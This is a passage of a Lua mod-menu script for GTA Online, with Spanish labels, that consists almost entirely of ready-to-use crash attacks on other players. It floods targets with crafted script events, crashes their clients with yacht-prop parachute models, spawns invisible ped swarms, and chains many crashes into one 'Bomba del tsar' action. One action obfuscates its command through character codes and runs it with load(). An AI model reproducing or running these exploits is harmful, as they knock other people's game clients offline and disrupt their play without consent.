            util.trigger_script_event(1 << player_id, {697566862, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
        end
        for i = 1, 20 do
            util.trigger_script_event(1 << player_id, {697566862, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149, player_id, math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {697566862, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
            util.trigger_script_event(1 << player_id, {697566862, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
        end
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149, player_id, math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
        end
        util.trigger_script_event(1 << player_id, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
        end
        menu.trigger_commands("givesh" .. players.get_name(player_id))
        util.yield(200)
        for i = 1, 200 do
            util.trigger_script_event(1 << player_id, {548471420, 16, 804923209, -303901118, 577104152, 653299499, -1218005427, -1010050857, 1831797592, 1508078618, 9, -700037855, -1565442250, 932677838})
        end
    end)

    menu.action(scrcrash, "Script Crash V5", {"crashv29"}, "Duele.", function(on_toggle)
        local int_min = -2147483647
        local int_max = 2147483647
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228, player_id, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228})
        end
        util.yield()
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228, player_id, math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228, math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228, player_id, math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
        end
        menu.trigger_commands("givesh" .. players.get_name(player_id))
        util.yield(100)
        util.trigger_script_event(1 << player_id, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
        util.trigger_script_event(1 << player_id, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
        util.trigger_script_event(1 << player_id, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
        util.trigger_script_event(1 << player_id, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
        util.trigger_script_event(1 << player_id, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228})
    end)

    menu.action(scrcrash, "Script Crash Poderoso", {}, "Duele :/.", function(on_toggle)
        local int_min = -2147483647
        local int_max = 2147483647
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483, player_id, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
        end
        util.yield(5)
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228, player_id, math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228, math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228, player_id, math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
        end
        util.yield(5)
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483, player_id, math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483, math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483, player_id, math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
            util.trigger_script_event(1 << player_id, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228})
            util.trigger_script_event(1 << player_id, {697566862, 3, 10, 9, 1, 1, 1})
            util.trigger_script_event(1 << player_id, {-1990614866, 0, 0})
            util.trigger_script_event(1 << player_id, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
        end
        util.yield(5)
        for i = 1, 20 do
            util.trigger_script_event(1 << player_id, {697566862, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149, player_id, math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {697566862, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
            util.trigger_script_event(1 << player_id, {697566862, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
        end
        util.yield(5)
        menu.trigger_commands("explode" .. players.get_name(player_id))
        util.yield(100)
        menu.trigger_commands("givesh" .. players.get_name(player_id))
        util.trigger_script_event(1 << player_id, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228})
        util.trigger_script_event(1 << player_id, {697566862, 3, 10, 9, 1, 1, 1})
        util.trigger_script_event(1 << player_id, {-1990614866, 0, 0})
        util.trigger_script_event(1 << player_id, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
    end)

    -- This is a Prisuhm crash fixed by me <3

    local krustykrab = menu.list(twotake, "Don Crangrejo", {}, "Es riesgoso spectear, cuidado: funciona en usuarios de 2T1")

    local peds = 5
    menu.slider(krustykrab, "Numero De Espatulas", {}, "Envia espatulas ah~", 1, 45, 1, 1, function(amount)
        util.toast(players.get_name(player_id).. " Se le han enviado espatulas")
        peds = amount
    end)

    local crash_ents = {}
    local crash_toggle = false
    menu.toggle(krustykrab, "Numero De Espatulas", {}, "Es riesgoso spectear, cuidado.", function(val)
        util.toast(players.get_name(player_id).. " Se le han enviado espatulas")
        local crash_toggle = val
        ryze.BlockSyncs(player_id, function()
            if val then
                local number_of_peds = peds
                local ped_mdl = util.joaat("ig_siemonyetarian")
                local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
                local ped_pos = players.get_position(player_id)
                ped_pos.z += 3
                ryze.request_model(ped_mdl)
                for i = 1, number_of_peds do
                    local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                    crash_ents[i] = ped
                    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                    TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                    ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                    ENTITY.SET_ENTITY_VISIBLE(ped, false)
                end
                repeat
                    for k, ped in crash_ents do
                        TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                        TASK.TASK_START_SCENARIO_IN_PLACE(ped, "PROP_HUMAN_BBQ", 0, false)
                    end
                    for k, v in entities.get_all_objects_as_pointers() do
                        if entities.get_model_hash(v) == util.joaat("prop_fish_slice_01") then
                            entities.delete_by_pointer(v)
                        end
                    end
                    util.yield_once()
                    util.yield_once()
                until not (crash_toggle and players.exists(player_id))
                crash_toggle = false
                for k, obj in crash_ents do
                    entities.delete_by_handle(obj)
                end
                crash_ents = {}
            else
                for k, obj in crash_ents do
                    entities.delete_by_handle(obj)
                end
                crash_ents = {}
            end
        end)
    end)

    local nmcrashes = menu.list(twotake, "Crasheos De Modelo Parecidos", {}, "")

    menu.action(nmcrashes, "Yate V1", {"bigyachtyv1"}, "Evento de crash (A1:EA0FF6AD) enviando el prop yacht.", function()
        local user = PLAYER.GET_PLAYER_PED(players.user())
        local model = util.joaat("h4_yacht_refproxy")
        local pos = players.get_position(player_id)
        local oldPos = players.get_position(players.user())
        ryze.BlockSyncs(player_id, function()
            util.yield(100)
            ENTITY.SET_ENTITY_VISIBLE(user, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
            PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
            util.yield(500)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
            util.yield(2500)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            ENTITY.SET_ENTITY_HEALTH(user, 0)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
            ENTITY.SET_ENTITY_VISIBLE(user, true)
        end)
    end)
    
    menu.action(nmcrashes, "Yate V2", {"bigyachtyv2"}, "Evento de crash (A1:E8958704) enviando el prop yacht001.", function()
        local user = PLAYER.GET_PLAYER_PED(players.user())
        local model = util.joaat("h4_yacht_refproxy001")
        local pos = players.get_position(player_id)
        local oldPos = players.get_position(players.user())
        ryze.BlockSyncs(player_id, function()
            util.yield(100)
            ENTITY.SET_ENTITY_VISIBLE(user, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
            PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
            util.yield(500)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
            util.yield(2500)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            ENTITY.SET_ENTITY_HEALTH(user, 0)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
            ENTITY.SET_ENTITY_VISIBLE(user, true)
        end)
    end)
    
    menu.action(nmcrashes, "Yate V3", {"bigyachtyv3"}, "Evento de crash (A1:1A7AEACE) enviando el prop yacht002.", function()
        local user = PLAYER.GET_PLAYER_PED(players.user())
        local model = util.joaat("h4_yacht_refproxy002")
        local pos = players.get_position(player_id)
        local oldPos = players.get_position(players.user())
        ryze.BlockSyncs(player_id, function()
            util.yield(100)
            ENTITY.SET_ENTITY_VISIBLE(user, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
            PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
            util.yield(500)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
            util.yield(2500)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            ENTITY.SET_ENTITY_HEALTH(user, 0)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
            ENTITY.SET_ENTITY_VISIBLE(user, true)
        end)
    end)
    
    menu.action(nmcrashes, "Yate V4", {"bigyachtyv4"}, "Evento de crash (A1:408D3AA0) enviando el prop apayacht.", function()
        local user = PLAYER.GET_PLAYER_PED(players.user())
        local model = util.joaat("h4_mp_apa_yacht")
        local pos = players.get_position(player_id)
        local oldPos = players.get_position(players.user())
        ryze.BlockSyncs(player_id, function()
            util.yield(100)
            ENTITY.SET_ENTITY_VISIBLE(user, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
            PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
            util.yield(500)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
            util.yield(2500)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            ENTITY.SET_ENTITY_HEALTH(user, 0)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
            ENTITY.SET_ENTITY_VISIBLE(user, true)
        end)
    end)
    
    menu.action(nmcrashes, "Yate V5", {"bigyachtyv5"}, "Evento de crash (A1:B36122B5) enviando el prop yachtwin.", function()
        local user = PLAYER.GET_PLAYER_PED(players.user())
        local model = util.joaat("h4_mp_apa_yacht_win")
        local pos = players.get_position(player_id)
        local oldPos = players.get_position(players.user())
        ryze.BlockSyncs(player_id, function()
            util.yield(100)
            ENTITY.SET_ENTITY_VISIBLE(user, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
            PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
            util.yield(500)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
            util.yield(2500)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            ENTITY.SET_ENTITY_HEALTH(user, 0)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
            ENTITY.SET_ENTITY_VISIBLE(user, true)
        end)
    end)

    --menu.action(crashes, "Inbloqueable V4 'Test'", {"crashv4"}, "Deberia estar arreglado por ahora", function()
    --    local mdl = util.joaat("apa_mp_apa_yacht")
    --    local user = PLAYER.PLAYER_PED_ID()
    --    local ped_pos = players.get_position(player_id)
    --   BlockSyncs(player_id, function()
    --        local old_pos = ENTITY.GET_ENTITY_COORDS(user, false)
    --        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user, 0xFBAB5776, 100, false)
    --        PLAYER.SET_PLAYER_HAS_RESERVE_PARACHUTE(players.user())
    --        PLAYER.SET_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user(), mdl)
    --        util.yield(50)
    --        local pos = players.get_position(player_id)
    --        pos.z += 300
    --        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
    --        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, ped_pos, false, false, false)
    --        repeat
    --            util.yield()
    --        until PED.GET_PED_PARACHUTE_STATE(user) == 0
    --        PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
    --        util.yield(50)
    --        TASK.CLEAR_PED_TASKS(user)
    --        util.yield(50)
    --        PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
    --        repeat
    --            util.yield()
    --        until PED.GET_PED_PARACHUTE_STATE(user) ~= 1
    --        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
    --        PLAYER.CLEAR_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user())
    --        ENTITY.SET_ENTITY_COORDS(user, ped_pos, false, false)
    --    end)
    --end)


    --menu.action(crashes, "Crash V5 'Test'", {""}, "Un crash antiguo de prisuhm, intente arreglarlo y mejorarlo.", function()
    --    local user = players.user()
    --    local user_ped = players.user_ped()
    --    local pos = players.get_position(user)
    --    BlockSyncs(player_id, function() 
    --        util.yield(100)
    --        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
    --        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
    --        TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
    --        util.yield()
    --        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
    --        util.yield(250)
    --        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
    --        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
    --        util.yield(1000)
    --        for i = 1, 5 do
    --            util.spoof_script("freemode", SYSTEM.WAIT)
    --        end
    --        ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
    --        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x, pos.y, pos.z, 0, false, false, 0)
    --    end)
    --end)
    
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

    menu.divider(crashes, "(Past Cwash)") -- Thx to every single stand developper that worked on this <3

    local c
    c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local kitteh_hash = util.joaat("a_c_cat_01")
    ryze.request_model_load(kitteh_hash)

    local crash_tbl = {
        "SWYHWTGYSWTYSUWSLSWTDSEDWSRTDWSOWSW45ERTSDWERTSVWUSWS5RTDFSWRTDFTSRYE",
        "6825615WSHKWJLW8YGSWY8778SGWSESBGVSSTWSFGWYHSTEWHSHWG98171S7HWRUWSHJH",
        "GHWSTFWFKWSFRWDFSRFSRTDFSGICFWSTFYWRTFYSSFSWSYWSRTYFSTWSYWSKWSFCWDFCSW",
    }

    local crash_tbl_2 = {
        {17, 32, 48, 69},
        {14, 30, 37, 46, 47, 63},
        {9, 27, 28, 60}
    }

    menu.action(crashes, "Cwash Pwayer", {"cwash"}, "I dont know if stils cwashes the pwayer.", function()
        if player_id == players.user() then 
            util.toast('nya nya! you cant cwash youwself.. >_<')
            return 
        end

        if player_id == players.get_host() then 
            util.toast('nya nya.. unfowtunatewy, u cannot cwash the host >_<')
            return
        end

        local cur_crash_meth = ""
        local cur_crash = ""
        for a,b in pairs(crash_tbl_2) do
            cur_crash = ""
            for c,d in pairs(b) do
                cur_crash = cur_crash .. string.sub(crash_tbl[a], d, d)
            end
            cur_crash_meth = cur_crash_meth .. cur_crash
        end

        local crash_keys = {"NULL", "VOID", "NaN", "127563/0", "NIL"}
        local crash_table = {109, 101, 110, 117, 046, 116, 114, 105, 103, 103, 101, 114, 095, 099, 111, 109, 109, 097, 110, 100, 115, 040}
        local crash_str = ""

        for k,v in pairs(crash_table) do
            crash_str = crash_str .. string.char(crash_table[k])
        end

        for k,v in pairs(crash_keys) do
            print(k + (k*128))
        end

        c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
        ryze.request_model_load(kitteh_hash)
        local kitteh = entities.create_ped(28, kitteh_hash, c, math.random(0, 270))
        -- i pwoimise no kittehs are hurt...
        AUDIO.PLAY_PAIN(kitteh, 7, 0)
        menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(players.user()))
        ryze.cwash_in_progwess()
        util.yield(500)
        for i=1, math.random(10000, 12000) do
        end
        local crash_compiled_func = load(crash_str .. '\"' .. cur_crash_meth .. PLAYER.GET_PLAYER_NAME(player_id) .. '\")')
        pcall(crash_compiled_func)
        util.toast('bye bye! nya nya >_<')
    end)

    local cwcred = menu.list(crashes, "Credits", {}, "")

    menu.action(cwcred, "Pwisuhm", {}, "Helped in this cwash >.<", function() end)
    menu.action(cwcred, "IcyPhoenix", {}, "Helped in this cwash >.<", function() end)
    menu.action(cwcred, "LanceScwipt", {}, "Helped in this cwash >.<", function() end)
    menu.action(cwcred, "Aaron", {}, "Helped in this cwash >.<", function() end)
    menu.action(cwcred, "And evewy one else.", {}, "Helped in this cwash >.<", function() end)
    

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

    menu.divider(crashes, "(Potentes)")

    if menu.get_edition() >= 1 then 
        menu.action(crashes, "Bomba del tsar", {"tsarbomba"}, "Crash demandante de pc, si no tienes buena pc no te recomiendo usarlo (Inbloqueable uwu)", function()
            --local outSync = menu.ref_by_path("Outgoing Syncs>Block")
            menu.trigger_commands("anticrashcamera on")
            menu.trigger_commands("potatomode on")
            menu.trigger_commands("trafficpotato on")
            util.toast("Iniciando...")
            util.toast("Pobre man")
            menu.trigger_commands("rlag3"..players.get_name(player_id))
            util.yield(2500)
            menu.trigger_commands("crashv1"..players.get_name(player_id))
            util.yield(400)
            menu.trigger_commands("crashv2"..players.get_name(player_id))
            util.yield(400)
            menu.trigger_commands("crashv4"..players.get_name(player_id))
            util.yield(500)
            menu.trigger_commands("crashv5"..players.get_name(player_id))
            util.yield(500)
            menu.trigger_commands("crashv6"..players.get_name(player_id))
            util.yield(500)
            menu.trigger_commands("crashv7"..players.get_name(player_id))
            util.yield(500)
            menu.trigger_commands("crashv8"..players.get_name(player_id))
            util.yield(700)
            menu.trigger_commands("crashv9"..players.get_name(player_id))
            --util.yield(400)
            --menu.trigger_commands("crashv5"..players.get_name(player_id))
            --util.yield(400)
            --menu.trigger_commands("crashv6"..players.get_name(player_id))
            --util.yield(400)
            --menu.trigger_commands("crashv7"..players.get_name(player_id))
            -- Turned off because of a self-crash error
            --util.yield(600)
            --menu.trigger_commands("crashv4"..players.get_name(player_id))
            util.yield(2000)
            menu.trigger_commands("crash"..players.get_name(player_id))
            --util.yield(400)
            --menu.trigger_commands("ngcrash"..players.get_name(player_id))
            --util.yield(400)
            --menu.trigger_commands("footlettuce"..players.get_name(player_id))
            --util.yield(400)
            --menu.trigger_commands("steamroll"..players.get_name(player_id))
            util.yield(1800)
            util.toast("Espera en lo que se limpia todo...")
            --menu.trigger_command(outSync, "off")
            menu.trigger_commands("rlag3"..players.get_name(player_id))
            menu.trigger_commands("rcleararea")
            menu.trigger_commands("potatomode off")
            menu.trigger_commands("trafficpotato off")
            util.yield(8000)
            menu.trigger_commands("anticrashcamera off")
        end)
    end

    if menu.get_edition() >= 2 then
        menu.action(crashes, "Bomba del tsar V2", {"tsarbomba"}, "Crash demandante de pc, si no tienes buena pc no te recomiendo usarlo (Inbloqueable uwu) \n(Necesita Regular Para Funcionar Bien/ Muy Posible Overload)", function()
            --local outSync = menu.ref_by_path("Outgoing Syncs>Block")
            menu.trigger_commands("anticrashcamera on")
            menu.trigger_commands("potatomode on")
            menu.trigger_commands("trafficpotato on")
            util.toast("Iniciando...")
            util.toast("Pobre man")
            menu.trigger_commands("rlag3"..players.get_name(player_id))
            util.yield(2500)
            menu.trigger_commands("crashv1"..players.get_name(player_id))
            util.yield(400)
            menu.trigger_commands("crashv2"..players.get_name(player_id))
            util.yield(400)
            menu.trigger_commands("crashv4"..players.get_name(player_id))
            util.yield(500)
            menu.trigger_commands("crashv5"..players.get_name(player_id))
            util.yield(500)
            menu.trigger_commands("crashv6"..players.get_name(player_id))
            util.yield(500)
            menu.trigger_commands("crashv7"..players.get_name(player_id))
            util.yield(500)
            menu.trigger_commands("crashv8"..players.get_name(player_id))
            util.yield(500)
            menu.trigger_commands("crashv9"..players.get_name(player_id))
            util.yield(500)
            menu.trigger_commands("crashv29"..players.get_name(player_id))
            util.yield(500)
            menu.trigger_commands("crashv91"..players.get_name(player_id))
